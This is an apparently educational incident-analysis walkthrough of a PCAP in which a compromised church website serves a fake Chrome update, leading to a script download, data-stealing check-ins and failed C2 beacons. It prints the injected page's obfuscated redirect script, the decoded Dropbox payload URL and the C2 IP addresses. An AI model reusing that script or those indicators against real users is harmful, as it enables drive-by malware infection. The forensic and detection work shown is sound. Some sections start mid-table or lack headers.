follows Follow-on C2 46.105.131.66:443 (refused) and 107.170.231.118:4143 (no answer), every ~7.5 min until the end Confirmed — no C2 session ever worked Family SocGholish-style fake update; follow-on behaviour consistent with Dridex Not confirmed (no hash or signature)

docs.title: Step 0 — Load the PCAP and check the case
docs.text:
Goal: give the PCAP a case name so its logs do not mix with other exercises, and make sure all tools show UTC.

  1. Rename the file to 20180630_SORTING_THROUGH_THE_ALERTS.pcap and drop it into \\10.50.10.60\incoming.
  2. On pcapbox, wait for DONE case=20180630_SORTING_THROUGH_THE_ALERTS in tail -f /data/logs/ingest.log.
  3. Splunk Preferences → Time zone = UTC; Arkime Settings → Timezone = UTC, time range All.
index=zeek sourcetype=zeek:conn
| stats count by pcap_case
  • index=zeek — the index (Splunk's "drawer") that holds Zeek logs.
  • sourcetype=zeek:conn — the connection log, one line per connection.
  • | — pass the results on to the next command.
  • stats count by pcap_case — count lines per case name.

ts, not _time

Zeek's own event time is ts (epoch seconds). Every query on this page sorts and prints with ts so it also works on a Splunk where _time is the ingest time. eval t=strftime(ts,"%H:%M:%S") turns it into a readable time.

Long case names

pcap_case=20180630_SORTING* works in Splunk (* = anything) as long as it matches no other case. Arkime's tags == needs the full name.

docs.title: Step 1 — Baselining
docs.text: Baselining = learning what is normal in this capture before looking for anything bad: time range, log types, internal PCs, how busy they are, and who they are.

docs.title: 1-1. Which logs exist
docs.text:
index=zeek pcap_case=20180630_SORTING_THROUGH_THE_ALERTS
| stats count by sourcetype
| sort - count
  • No sourcetype → all log types of this case. sort - count = largest first (- descending).
sourcetype          count
zeek:conn           729
zeek:dns            313
zeek:ssl            265
zeek:files          176
zeek:x509           171
zeek:http           134
zeek:ocsp           72
zeek:kerberos       37
zeek:ldap_search    21
zeek:dce_rpc        18
zeek:ldap           13
zeek:weird          7
zeek:smb_mapping    6
zeek:software       5
zeek:ntp            4
zeek:smb_files      2
zeek:ntlm           1

[data] Reading:

  • zeek:dhcp is missing. The PC already had its IP lease when the capture started, so the host name must come from somewhere else (1-5).
  • Web logs dominate (ssl 265, http 134): someone was browsing. HTTPS is twice HTTP, but the 134 HTTP requests can be read in full — they will be the main material.
  • Domain logs (kerberos, ldap, dce_rpc, smb_*, ntlm) = an AD PC talking to its DC: logons, group policy. User and computer names live here.
  • ocsp (certificate checks), ntp (time), weird (odd packets) are normally harmless. software lists programs Zeek recognised — useful in 1-5.

docs.title: 1-2. Capture window
docs.text:
index=zeek sourcetype=zeek:conn pcap_case=20180630_SORTING_THROUGH_THE_ALERTS
| stats min(ts) as first max(ts) as last count as sessions
| eval duration_min=round((last-first)/60,1)
| eval first=strftime(first,"%Y-%m-%d %H:%M:%S"), last=strftime(last,"%Y-%m-%d %H:%M:%S")
  • Line 2: one summary row — earliest, latest, number of connections. as names the result.
  • Line 3: eval computes a new field; minutes, one decimal.
  • Line 4: epoch → readable date. Line 3 must come before line 4 — after line 4 first and last are text and cannot be subtracted.
first                 last                  sessions  duration_min
2018-06-30 20:27:15   2018-06-30 20:59:06   729       31.9

docs.title: 1-3. Which internal IPs start connections
docs.text:
index=zeek sourcetype=zeek:conn pcap_case=20180630_SORTING_THROUGH_THE_ALERTS
| stats count as sessions dc(id_resp_h) as destinations sum(orig_bytes) as sent sum(resp_bytes) as received min(ts) as first max(ts) as last by id_orig_h
| eval first=strftime(first,"%H:%M:%S"), last=strftime(last,"%H:%M:%S")
| sort - sessions
  • id_orig_h = the IP that started the connection (orig = originator, resp = responder, _h = host, _p = port).
  • dc() = distinct count. orig_bytes / resp_bytes = payload bytes sent by each side.
id_orig_h      sessions  destinations  sent     received   first     last
172.16.2.169   729       184           845926   34269192   20:27:15  20:59:06

[data] Reading:

  • One PC. The DC does not appear: Zeek files its NetBIOS reply under the connection the PC started (for UDP too, the side that sends first is orig).
  • 184 destinations in 32 minutes — a beacon needs 1–3. This is a person browsing (one news page pulls dozens of ad and CDN servers), so "top talker" will not find the malware. The plan is to remove the normal and see what is left.
  • Received ≫ sent (34 MB vs 0.85 MB) — normal for a PC. The reverse would suggest exfiltration.

docs.title: 1-4. Arkime cross-check
docs.text:
tags == 20180630_SORTING_THROUGH_THE_ALERTS

654 sessions (Zeek 729 — the tools split UDP and retried connections differently; the picture is the same). SPIView → General → Src IP / Dst IP shows one PC and a long list of destinations.

How to read Databytes / Bytes: the top number is data (payload), the bottom is total bytes with headers. Databytes 0 = only connection signals, no data.

[data] Lines that look different — noted, not concluded:

Destination Shape 46.105.131.66:443 Several sessions per source port, 2 packets each, Databytes 0, repeating every few minutes 107.170.231.118:4143 3 packets, Databytes 0, unusual port, repeating every few minutes

Everything else is ordinary DC traffic (53 DNS, 88 Kerberos, 123 NTP, 389 LDAP, 445 SMB, 137/138 NetBIOS, 5355 LLMNR wpad, 1900 SSDP) and crl.microsoft.com.

docs.title: 1-5. Who is 172.16.2.169
docs.text:
No DHCP, so use the other places Windows says its name.

① Kerberos

index=zeek sourcetype=zeek:kerberos pcap_case=20180630_SORTING_THROUGH_THE_ALERTS
| eval t=strftime(ts,"%H:%M:%S")
| stats min(t) as first count values(request_type) as types values(success) as success values(error_msg) as errors by client
| sort first
  • client = account/REALM. values() = every distinct value. request_type: AS = logon ticket (TGT), TGS = service ticket, AP = presenting a ticket to a service.
client                              first     count  types    success      errors
/FABULOUSDUKES.COM                  20:27:17  13     AP       true
CONSERVATOR-PC$/FABULOUSDUKES.COM   20:27:17  11     AS TGS   false true   KDC_ERR_PREAUTH_REQUIRED
conservator-pc$/FABULOUSDUKES.COM   20:27:17  2      AS       false true   KDC_ERR_PREAUTH_REQUIRED
lloyd.maxwell/FABULOUSDUKES         20:27:18  2      AS       false true   KDC_ERR_PREAUTH_REQUIRED
lloyd.maxwell/FABULOUSDUKES.COM     20:27:18  5      TGS      true
conservator-pc$/fabulousdukes.com   20:27:44  2      AS       false true   KDC_ERR_PREAUTH_REQUIRED
Seen Meaning Name ends in $ Computer account → host name CONSERVATOR-PC No $ User → lloyd.maxwell, logged on at 20:27:18 Empty account (/FABULOUSDUKES.COM, AP) The name is inside the encrypted part of an AP request; Zeek cannot show it. Normal Same account in different case/realm Windows is not consistent; same account KDC_ERR_PREAUTH_REQUIRED then success Normal pre-authentication. A wrong password would be KDC_ERR_PREAUTH_FAILED — none here

② NTLM

index=zeek sourcetype=zeek:ntlm pcap_case=20180630_SORTING_THROUGH_THE_ALERTS
| eval t=strftime(ts,"%H:%M:%S")
| table t id_orig_h id_resp_h id_resp_p username hostname domainname server_nb_computer_name success

t         id_orig_h     id_resp_h   id_resp_p  username          hostname         domainname     server_nb_computer_name  success
20:27:35  172.16.2.169  172.16.2.9  445        CONSERVATOR-PC$   CONSERVATOR-PC   FABULOUSDUKES  FABULOUSDUKE-DC          true

The computer account logging on to the DC's SMB share at start-up (group policy). It also names the DC: FABULOUSDUKE-DC.

③ DNS dynamic update

index=zeek sourcetype=zeek:dns pcap_case=20180630_SORTING_THROUGH_THE_ALERTS qtype_name=SOA
| eval t=strftime(ts,"%H:%M:%S")
| table t id_orig_h id_resp_h query qtype_name rcode_name

t         id_orig_h     id_resp_h   query                              qtype_name  rcode_name
20:37:03  172.16.2.169  172.16.2.9  conservator-pc.fabulousdukes.com   SOA         NOERROR
20:27:16  172.16.2.169  172.16.2.9  conservator-pc.fabulousdukes.com   SOA         NOERROR

A domain PC registers its own name with the DC; the SOA query comes first. Exactly 10 minutes apart — Windows re-registering. Three sources agree: CONSERVATOR-PC / fabulousdukes.com.

④ Software

index=zeek sourcetype=zeek:software pcap_case=20180630_SORTING_THROUGH_THE_ALERTS
| eval t=strftime(ts,"%H:%M:%S")
| table t host software_type name unparsed_version

t         host          software_type   name                  unparsed_version
20:43:13  172.16.2.169  OS::WINDOWS     Windows
20:33:54  172.16.2.169  HTTP::BROWSER   Microsoft BITS        Microsoft BITS/7.5
20:28:47  172.16.2.169  HTTP::BROWSER   MSIE                  Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Win64; x64; Trident/7.0; .NET CLR 2.0.50727; SLCC2; ...)
20:28:00  172.16.2.169  HTTP::BROWSER   Microsoft-CryptoAPI   Microsoft-CryptoAPI/6.1
20:27:53  172.16.2.169  HTTP::BROWSER   Chrome                Mozilla/5.0 (Windows NT 6.1; Win64; x64) ... Chrome/67.0.3396.99 Safari/537.36
  • Zeek writes each program it recognises once. Windows NT 6.1 = Windows 7, Win64; x64 = 64-bit.
  • The user's browser is Chrome 67 (20:27:53). BITS (Windows downloads) and CryptoAPI (certificate checks) are Windows itself.
  • [data] 54 s later something calls itself "MSIE 7.0" — a 2006 browser. With Trident/7.0 (IE11's engine) on Windows 7 this is the default User-Agent of Windows' HTTP objects used by scripts (wscript, Office macros). Noted as a candidate.

Baseline notes — three candidates, no conclusions yet:

  1. 46.105.131.66:443 — no data, repeating
  2. 107.170.231.118:4143 — no data, unusual port, repeating
  3. 20:28:47 MSIE 7.0 — a program that is not the user's browser

docs.title: Step 2 — External destinations: remove the normal, see what is left
2-1. By port
docs.text:
index=zeek sourcetype=zeek:conn pcap_case=20180630_SORTING_THROUGH_THE_ALERTS id_orig_h=172.16.2.169 NOT id_resp_h=172.16.0.0/12 NOT id_resp_h=224.0.0.0/4
| stats count dc(id_resp_h) as ips values(service) as service values(conn_state) as states sum(orig_bytes) as sent sum(resp_bytes) as received by proto id_resp_p
| sort - count
  • NOT id_resp_h=172.16.0.0/12 — Splunk understands CIDR ranges on IP fields; drops internal addresses. 224.0.0.0/4 drops multicast.
  • service = the protocol Zeek recognised from the content; empty = Zeek could not tell.
  • conn_state: SF normal start and end · S0 SYN, no answer · REJ SYN answered by RST (refused) · RSTO/RSTR reset by PC/server · SH/OTH partial, common at capture edges.
proto  id_resp_p  count  ips  service  states                          sent    received
tcp    443        364    163  ssl      OTH REJ RSTO RSTR S1 SF         642014  5667734
tcp    80         27     14   http     RSTO SF                         58106   28337141
tcp    4143       16     1             S0                              0       0
udp    443        10     6             SF                              45454   174932

[data] Reading:

  • tcp/443: HTTPS browsing — but a REJ is mixed in (2-3 shows who).
  • tcp/80: 28 MB received — 3-1 shows it is BITS from Google.
  • tcp/4143: one IP, no service, only S0, zero bytes. Unusual port, never answered.
  • udp/443 with no service is QUIC (Google's HTTPS over UDP, used by Chrome). Zeek's QUIC analyser is off, hence empty. Normal.

docs.title: 2-2. By domain
docs.text:
index=zeek sourcetype=zeek:dns pcap_case=20180630_SORTING_THROUGH_THE_ALERTS id_orig_h=172.16.2.169 NOT query="*fabulousdukes.com"
| rex field=query "(?<domain>[^.]+\.[^.]+)$"
| eval t=strftime(ts,"%H:%M:%S")
| stats min(t) as first count dc(query) as names values(query) as examples by domain
| eval examples=mvindex(examples,0,2)
| sort first
  • rex cuts part of a value into a new field with a regular expression. (?<domain> … ) names the part; [^.]+ = characters that are not a dot; \. = a real dot; $ = end. Result: the last two labels (r4---sn-p5qs7nek.gvt1.com → gvt1.com).
  • mvindex(list,0,2) keeps the first three values (counted from 0).

116 domains came back. How to remove the normal:

  1. Known companies: microsoft, google, googleapis, bing, facebook, twitter, yahoo, cloudfront, windows.net.
  2. The CNN burst: cnn.com at 20:27:52, then dozens of ad and tracking domains 20:27:53–20:28:03 (optimizely, doubleclick, outbrain, rubiconproject, pubmatic, criteo …). Names with ad, pixel, sync, match, track, cdn, beacon are mostly ad tech.
  3. Windows itself: gvt1.com (BITS), digicert.com, _tcp.local (Chromecast discovery).

[data] What is left, in time order:

First Domain Note 20:27:52 stmarybahrain.com (www.) A church site, same second as CNN 20:27:54 positiverefreshment.org (track.) "track" on a non-ad domain 20:27:56 sineadhollywoodnutt.com (lw2e.) Person-like name, random-looking sub-domain 20:27:59 dropbox.com Legitimate, but a file download service 20:28:00 dropboxusercontent.com (uc7cfbc6f….dl.) Dropbox's file server 20:28:24 summerhamster.com Odd name — see the question box 20:28:46 kimbrelelectric.com (bb17eb22.login3.) Electrical company name with a generated-looking sub-domain

Question: why is summerhamster.com not kept?

Its DNS answer is a CNAME (alias) to bc.sp-prod.net, an ad platform, and Chrome made one HTTPS connection to it. Same shape as the other ad domains. Following the CNAME is another way to remove the normal:

index=zeek sourcetype=zeek:dns pcap_case=20180630_SORTING_THROUGH_THE_ALERTS query="www.summerhamster.com"
| table ts query answers

docs.title: 2-3. Destinations reached with no DNS lookup
docs.text:
People browse by name. A connection to an IP that was never looked up may be an address built into a program.

index=zeek sourcetype=zeek:conn pcap_case=20180630_SORTING_THROUGH_THE_ALERTS id_orig_h=172.16.2.169 NOT id_resp_h=172.16.0.0/12 NOT id_resp_h=224.0.0.0/4
    NOT [search index=zeek sourcetype=zeek:dns pcap_case=20180630_SORTING_THROUGH_THE_ALERTS | mvexpand answers | rename answers as id_resp_h | dedup id_resp_h | fields id_resp_h]
| eval t=strftime(ts,"%H:%M:%S")
| stats min(t) as first max(t) as last count values(id_resp_p) as ports values(conn_state) as states sum(orig_bytes) as sent sum(resp_bytes) as received by id_resp_h
| sort first
  • The [ … ] subsearch runs first: every IP in DNS answers (mvexpand splits a multi-value field into one row per value; rename matches the conn field name). It returns (id_resp_h="a" OR id_resp_h="b" …); NOT keeps only IPs never seen in a DNS answer.
  • Caveat: IPs looked up before the capture also appear here. Watch for those near the capture start.
id_resp_h         first     last      count  ports  states  sent  received
46.105.131.66     20:29:00  20:59:06  30     443    REJ     0     0
107.170.231.118   20:31:14  20:53:51  16     4143   S0      0     0

[data] Reading: only two of 184 destinations — exactly baseline candidates 1 and 2. The REJ in 2-1's tcp/443 row is 46.105.131.66: port 443 but not HTTPS, refused every time. First seen almost 2 minutes after the capture starts, then repeated for 30 minutes — a program, not a person. And 20:29:00 is only 13 seconds after candidate 3 (MSIE 7.0, 20:28:47).

Clues so far, in time order: church site (20:27:52) → track. (20:27:54) → lw2e. (20:27:56) → Dropbox file server (20:28:00) → kimbrelelectric (20:28:46) → MSIE 7.0 (20:28:47) → no-DNS IP attempts (20:29:00). [inference] A site visit led to a download, something non-browser then talked to kimbrelelectric, then hard-coded IPs. Step 3 checks this with HTTP.

docs.title: Step 3 — HTTP: from a church website to a fake Chrome update
3-1. HTTP by host
docs.text:
index=zeek sourcetype=zeek:http pcap_case=20180630_SORTING_THROUGH_THE_ALERTS
| eval host=mvdedup(host)
| eval t=strftime(ts,"%H:%M:%S")
| stats count min(t) as first values(method) as methods values(user_agent) as user_agents sum(response_body_len) as received by host
| sort first
  • host = the HTTP Host header. method: GET fetch, POST send, HEAD headers only.
  • mvdedup(host) — explained in the box below.

Question: the counts came out doubled — why, and is there a permanent fix?

The first run summed to 268 while 134 events were found. In the results host had two identical values: ["www.stmarybahrain.com","www.stmarybahrain.com"].

pcapbox copies the Zeek JSON key "host" into Splunk's built-in host field at index time (so host="…" searches are fast). At search time KV_MODE = json extracts the same key again and appends it to the existing host field. Zeek's key name collides with Splunk's reserved field name. stats … by host counts once per value → every event twice. zeek:software (key host = IP) had the same issue.

  • In a query: | eval host=mvdedup(host) removes duplicate values.

  • Permanent fix (pcapbox): add a calculated field to the search-time stanza [source::/data/zeek/...] in /opt/splunk/etc/apps/pcapbox/local/props.conf, then restart Splunk:

    EVAL-host = mvdedup(host)

    Calculated fields run after JSON extraction, so the duplicate is removed on every search, for data already indexed — no re-ingest. Check: … | eval n=mvcount(host) | stats count by n should give only n=1.

  • Keep the mvdedup habit on team Splunks whose config you cannot change; it does no harm where there is no duplicate.

host                                   count  first     methods    user_agents                              received
www.stmarybahrain.com                  52     20:27:53  GET        Mozilla/5.0 ... Chrome/67.0.3396.99 ...  1220096

docs.text:
Zeek keeps summaries, not bodies. What the page told the browser to do is in the body.

tags == 20180630_SORTING_THROUGH_THE_ALERTS && host.http == lw2e.sineadhollywoodnutt.com && http.uri == *index.php*

Expand the session (+), choose natural view and uncompress, read the response.

<title>Update Chrome</title>
<h1 id="main-title" tabindex="-1">You are using an older version of Chrome</h1>
<a class="button eula-download-button download-button ..." href="javascript:void(0)" id="buttonDownload">Update Chrome</a>

var fileUrl = getUrl('#1)=(l)d(?as8j{.)2}2,.y3v.)2(7;_(e,m;odr)h)C,/fs;n{l7i{dim,c7678,d(r99jl6vif(/0s)/lmyopcg.ex(o2b{p,ogr{dv.{w(w(wp/)/,:;s,p;t{t(h,');
setTimeout(function() { window.location.href = fileUrl; }, 3000);
document.getElementById('buttonDownload').onclick = function() { window.location.href = fileUrl; return false; };

[data] Reading:

  • The script replaces the church page in place (document.head / document.body): the address bar still shows the church site, the screen shows a Chrome update page.
  • After 3 seconds (setTimeout … 3000) it opens fileUrl by itself; the button does the same.
  • Real Chrome never asks a website to update it. A website offering a browser update is almost always fake.
  • fileUrl is hidden. The function that unhides it is in the same reply:
function getUrl(url) {
    var res = '';
    for(var i=0; i<url.length; i++) {
        if(i%2===1) res += url[i];
    }
    res = res.split("").reverse().join("");
    return res;
}
Line Meaning CyberChef for (… i<url.length …) look at every character — if(i%2===1) res += url[i] i%2 = remainder of i/2; keep positions 1, 3, 5 … = the second of every pair Find / Replace (.)(.) → $2 split("").reverse().join("") split, reverse, join Reverse

docs.title: 3-4. Decoding the URL (CyberChef or the browser console)
docs.text:
CyberChef recipe

  1. Input: the text inside the quotes (129 characters — check ABC under Input).
  2. Find / Replace — Find (.)(.) (REGEX), Replace $2, Global match on.
  3. Reverse — By Character.

(.) = any one character, remembered as group 1 / group 2; $2 = replace the pair with group 2. 129 is odd, so the last character has no pair, is left alone, and after Reverse becomes the first output character (,). Ignore it.

Question: the output was just the input reversed / full of symbols

Two mistakes made on the way, both common:

  • Find and Replace were swapped ($2 in Find, Replace empty). In a regex $ means "end of line", so $2 matches nothing and only Reverse runs.
  • The quotes were left in the input (ABC showed 131). One extra leading ' shifts every pair by one, so the recipe picks positions 0, 2, 4 … — exactly the junk characters. In JavaScript the quotes only mark where the text starts and ends; they are not data.

Habit: when output looks wrong, check the input's start, end and length first.

Shortcut — run only the decode function in a browser console

  1. In an offline VM (VMware → Network Adapter → untick Connected), open about:blank.
  2. F12 → Console. On first paste, type allow pasting by hand.
  3. Read the function first. Do not run it if it contains window.location, document.write, innerHTML, eval(, Function(, fetch(, XMLHttpRequest, new Image, setTimeout. getUrl only loops, splits, reverses and returns — safe. Never copy the setTimeout / onclick lines: they navigate.
  4. Paste the function, Enter → undefined (defined, nothing computed yet).
  5. Call it with quotes this time (in code, quotes mark text):
getUrl('#1)=(l)d(?as8j{.)2}2,.y3v.)2(7;_(e,m;odr)h)C,/fs;n{l7i{dim,c7678,d(r99jl6vif(/0s)/lmyopcg.ex(o2b{p,ogr{dv.{w(w(wp/)/,:;s,p;t{t(h,')

'https://www.dropbox.com/s/fvl9rd86cmdilns/Chrome_72.3.22.js?dl=1'

copy(getUrl('…')) puts the result on the clipboard. Typical errors: Unexpected end of input (missing }), getUrl is not defined (function not pasted, or a case typo), Invalid or unexpected token (a line break inside the string from Arkime's wrapping, or curly quotes).

[data] Reading the URL:

Part Meaning www.dropbox.com/s/fvl9rd86cmdilns/ A Dropbox shared link uploaded by the attacker Chrome_72.3.22.js A JavaScript file, not an installer (.exe). Double-clicked on Windows it runs in Windows Script Host (wscript.exe) with the user's rights, outside the browser's sandbox ?dl=1 Download straight away instead of preview

Chrome 72 did not exist in June 2018 (the PC runs 67). Dropbox is trusted and HTTPS — filters let it through and the content is invisible in the PCAP.

Question: why did Dropbox suddenly appear before the URL was decoded?

It should not have. The right order is decode the URL → see the domain → search for that domain. The guide named Dropbox early because the PCAP had been analysed before. What the analyst's own data showed by then: Dropbox in 2-2 at 20:27:59–20:28:00, and setTimeout(…, 3000) on a page that loaded at 20:27:57. Timing alone is an inference; the decoded URL is the evidence.

Question: who could work this out without help?

Nobody decodes from scratch. Three habits make it routine: (1) obfuscated text always travels with its decoder — find the function around the text and read it; (2) map each command to a CyberChef operation (%2 → pick characters, reverse → Reverse, atob → From Base64, ^ → XOR); (3) when the function is simple and safe, run it in an offline console. And if it still does not decode, the network alone (fake page → 3 s → Dropbox) is enough for the report; write "URL obfuscated, not decoded".

docs.text:

20:28:00.733   162.125.6.2   443        log.getdropbox.com                                       TLSv12   true

| eval t=strftime(ts,"%H:%M:%S")
| table t id_resp_h id_resp_p duration orig_bytes resp_bytes conn_state

t         id_resp_h    id_resp_p  duration   orig_bytes  resp_bytes  conn_state
20:28:01  162.125.9.6  443        180.389    1237        23469       SF

[data] Reading:

  • Fake page 20:27:57.029 + 3 s = 20:28:00.4 = the first Dropbox connection. The code and the traffic agree to 0.4 s; the user did not need to click.
  • www.dropbox.com → log.getdropbox.com (Dropbox's own page telemetry, normal) → *.dl.dropboxusercontent.com (the file server that serves dl=1).
  • ~23 KB received including TLS overhead → a file of roughly 20 KB or less, the size of a script. SF = transfer completed.
  • duration 180 s is not transfer time. The browser keeps the connection open after a download (keep-alive) and closes it when idle.
  • Content and hash are not visible — the host owner must collect C:\Users\lloyd.maxwell\Downloads\Chrome_72.3.22.js (location confirmed in 4-5).

Then 45 seconds with no network clue (20:28:01 → 20:28:46) — about the time it takes to notice the download, click it and let Windows run it.

docs.title: Step 4 — The script runs: a WScript C2
docs.text: Goal: a downloaded file is not an infection until it runs. Find proof of execution and what it sent and received.

docs.title: 4-1. The three POSTs (Splunk)
docs.text:
index=zeek sourcetype=zeek:http pcap_case=20180630_SORTING_THROUGH_THE_ALERTS host="bb17eb22.login3.kimbrelelectric.com"

20:28:48.186   CwVJZs2YKLpHSE8LQ1  49440      93.95.100.138  POST    /blank.gif  200     2644              348868             text/plain

  • One connection, three seconds, three POSTs — a program following a script, not a person clicking.
  • POST to /blank.gif — you download a GIF, you do not post data to one. Camouflage for anyone skimming logs.
  • Rhythm: small (72) → large (2,644) → small (256) sent; medium (11.9 KB) → very large (349 KB) → nothing received. Something was delivered.

[data] Reading: both replies are text/plain, and in Arkime they are long runs of 0-9a-f — hex text. Two characters per byte, so 349 KB of text = ~174 KB of data. An EXE sent as hex text has no MZ and no application/x-dosexec, so an "EXE download" search misses it. The MD5 is of the hex text, not of any file on disk.

[data] Reading:

  • Age: does not belong in a request. Caches put it in replies, and its value is seconds. Here the PC sends 16 hex characters, the same in every POST → [inference] a victim ID passed through a header.
  • UA-CPU: AMD64 is added by Windows' scripting HTTP objects on 64-bit systems. With MSIE 7.0 → a Windows script, not a browser.
  • Content-Type: application/x-www-form-urlencoded = form data, name=value. That is the key to decoding (next).

docs.title: 4-5. Decoding the POST bodies (CyberChef)
docs.text:
No decoder function this time — it is inside the .js on the PC. So read the shape:

  1. After a= only 0-9a-f, even length → hex. From Hex → unreadable bytes → another layer.
  2. The commonest simple layer is 1-byte XOR — only 256 keys. Pick the right one with a crib: text that must be in the plain text. This is form data (name=value&…), and the outer names are single characters (a=, b=), so try &1=.

Recipe (each body separately; copy only the hex after a=, b=, c=):

  1. From Hex
  2. XOR Brute Force — Key length 1, Crib &1=. Note the key on the readable row.
  3. Replace it with XOR — that key, HEX.
  4. URL Decode (%5C → \, %3A → :, %7C → |).

Lengths

Zeek's request_body_len includes the two characters a=. The hex part is therefore 70 characters for a=, 2,642 for b= and 254 for c=. Check ABC under Input — b= is wrapped over many lines in Arkime and easy to cut short.

a= — key 5d

Z␀0=c8ae6d45&1=507&2=1530390526937&

The first one or two bytes are junk (probably key information) — ignore. 0=c8ae6d45 looks like an ID; 1=507 looks like a campaign/build number (it repeats in b= and c=); 2= is 13 digits = epoch milliseconds. CyberChef From UNIX Timestamp (Units: Milliseconds) or Splunk:

| makeresults
| eval t=strftime(1530390526937/1000, "%Y-%m-%d %H:%M:%S.%3N")
| table t

| makeresults creates one empty row to calculate on. Result 20:28:46.937 UTC — the script's own clock, between the DNS lookup (46.573) and the POST (47.389). The message was built at that moment, on that PC.

b= — key db, then URL Decode

No. Meaning 1 Where the script ran: the Downloads folder. The Dropbox file was executed — this confirms 3-5 3, 4, 7 Host, user, domain — a company PC, a valuable target 8–10 Default BIOS strings (common on self-built PCs) 11 Antivirus: Windows Defender only 13–16 Network card, keyboard, mouse, screen — "is this a real person's PC?" 17 Process list: wscript.exe (the script engine — the identity of MSIE 7.0), 23 × chrome.exe, NVIDIA processes (matching the GPU in the TDS fingerprint), no analysis tools 20 20:28:48.027 UTC, 0.16 s before the POST

[inference] The attacker decides from this whether the PC is worth the next stage: domain-joined, real hardware, only the built-in AV. It passed — the 349 KB reply came right after.

Question: where is c=?

In the same Arkime session — the third POST. It did not show because Arkime displays the first 200 packets by default, and this session has 299 + 296. c= comes after the 349 KB reply. Change 200 packets to a larger value, switch Dst off to show only the PC's side, or Ctrl+F for Content-Length: 256. If something you expect is missing in Arkime, compare the session's packet count with the display limit first.

How was c= known to exist? From the analyst's data: 4-1 shows a third POST with a 256-byte body. That it is called c= was an inference from a=, b= — and from the earlier analysis of this PCAP, which should have been said.

c= — key c8, then URL Decode

0=507&1=C:\Users\LLOYD~1.MAX\AppData\Local\Temp\Chrome_72.3.22.exe&2=0&3=0&4=1&5=0&6=0&7=0&8=0&9=1530390529896&
  • [data] An .exe with the same name, in the user's %TEMP%. LLOYD~1.MAX is the 8.3 short name of lloyd.maxwell (how %TEMP% is often expanded). 9= = 20:28:49.896 UTC. 2=–8= look like status flags — meaning unknown.
  • [inference] The script decoded the 349 KB reply, saved it as Chrome_72.3.22.exe, ran it, and reported the path. Execution needs network proof → Step 5.

Question: are there rules for which decoding to try when?

Yes — the character set says most of it. 0-9a-f, even length → From Hex. A-Z a-z 0-9 + / with = at the end → From Base64. %xx → URL Decode (usually the last layer). \x41 → Unescape string; \u0041 → Unescape Unicode Characters; comma-separated decimals → From Charcode. Starts like TVqQ (Base64) / 4d5a (hex) → an EXE; H4sI / 1f8b → gzip. Unreadable bytes after a decode, low-to-medium Entropy → 1-byte XOR. Crib = text that must be there at that layer: &1= for form data, http for a URL, the host or user name found in baselining for a check-in, This program for an EXE. If XOR is followed by URL encoding, the crib for a path is C%3A%5C, not C:\.

docs.title: Step 5 — After the payload: back to baseline candidates 1 and 2
docs.text:
Why this step: c= says an EXE was saved. Saved is not run. [inference] A newly run malware program almost always contacts its own C2 first. So the question becomes: what new external traffic starts after 20:28:50? The answer was already in the notes — 2-2 showed no new suspicious domains after 20:28:46, and 2-3 showed exactly two no-DNS IPs. They were unexplained in baselining; now they can be tested against the new fact.

What the query looks for:

Question How Did it start right after the EXE? first ts vs c= (20:28:49.9) Program or person? delta — a fixed rhythm Did any connection succeed? conn_state, history, packet counts 
index=zeek sourcetype=zeek:conn pcap_case=20180630_SORTING_THROUGH_THE_ALERTS id_resp_h IN ("46.105.131.66","107.170.231.118")
| sort ts
| delta ts as gap
| eval t=strftime(ts,"%H:%M:%S.%3N"), gap=round(gap,1)
| table t id_orig_p id_resp_h id_resp_p conn_state history orig_pkts resp_pkts gap
  • sort ts first — delta works in row order. delta ts as gap = seconds since the previous row.
  • history = the TCP signals Zeek saw, upper case from the PC, lower case from the server: S/s SYN, h SYN-ACK, R/r RST, D/d data. Sr = "PC asked, server refused"; S = "PC asked, no answer".

20:36:10.366   49491      46.105.131.66     443        REJ         Sr       1          1          266.0
...            (same pattern)
20:59:06.815   49514      46.105.131.66     443        REJ         Sr       1          1          0.6

[data] Reading:

  • First attempt 20:29:00.525 — about 10 s after c=.
  • 46.105.131.66:443 — Sr, 1 packet each way. The server is up but nothing listens on 443; it refuses. Windows retries a refused connection twice, 0.6 s apart, then tries again on a new port → 6 rows per round. Zeek closes a connection on RST, so each retry is a new row: 6 × 5 rounds = the 30 in 2-3.
  • 107.170.231.118:4143 — S, no reply at all. Server down or packets dropped on the way. Windows re-sends the SYN with growing gaps (~3 s, ~6 s), gives up after ~9 s, tries a new port. Zeek splits each port into two rows after the idle gap → 4 rows × 4 rounds = 16.
  • Arkime shows the same: SYN 1 SYN-ACK 0 RST 1, Databytes 0.

Rounds:

46.105.131.66 then, after ~2 min 107.170.231.118 20:29:00 → 20:31:14 20:36:10 → 20:38:30 20:43:37 → 20:45:53 20:51:14 → 20:53:21 20:59:04 (capture ends)

The two IPs alternate: IP 1 → ~2 min → IP 2 → ~5 min → repeat, a cycle of ~7.5 minutes until the capture ends. [inference] A program working through a built-in C2 list and sleeping between rounds.

Conclusion:

  • [data] 10 s after the EXE report: two hard-coded IPs, fixed rhythm, never connected. No C2 commands, no further downloads, no exfiltration on the network.
  • [inference] %TEMP%\Chrome_72.3.22.exe ran and tried its C2. Hard-coded IP:port C2 on 443 and odd high ports after a fake-update infection matches how Dridex behaved in 2018 — without a hash or signature the report says "consistent with Dridex (unconfirmed)".
  • A dead C2 protects the PC only today. The host is infected: clean it, and treat the user's passwords as exposed.

docs.title: Step 6 — One simple Snort rule
docs.text:
Candidate For Against C2 domain kimbrelelectric.com Confirmed post-execution traffic; plain HTTP The domain can change /chromefiles/ Catches the pre-infection stage Other sites may use the name The two C2 IPs Catches the failed C2 No content; IPs change easily 
alert tcp $HOME_NET any -> $EXTERNAL_NET 80 (msg:"SocGholish C2 kimbrelelectric.com - Sung"; content:"kimbrelelectric.com"; nocase; sid:1000041; rev:1;)
  • $HOME_NET any -> $EXTERNAL_NET 80 — inside to outside port 80. content + nocase — the text anywhere in the packet, any case (it is in each POST's Host: header). sid 1000000+ = own rules. The generated sub-domain (bb17eb22.login3.) is left out on purpose — it may change per victim.

Add the rule on one line to \\10.50.10.60\rules\local.rules, then on pcapbox:

sudo snort -T -c /etc/snort/snort.conf 2>&1 | tail -5
snort-test 20180630_SORTING_THROUGH_THE_ALERTS

[1/2] 문법 OK
[2/2] /data/pcap/20180630_SORTING_THROUGH_THE_ALERTS.pcap
  개수 [gid:sid:rev] 메시지
      3 [1:1000041:1] SocGholish C2 kimbrelelectric.com - Sung

3 alerts = the three POSTs. The DNS lookup has the name too, but DNS is UDP and the rule is TCP.

sudo pcap-ingest: command not found — and do not re-ingest anyway

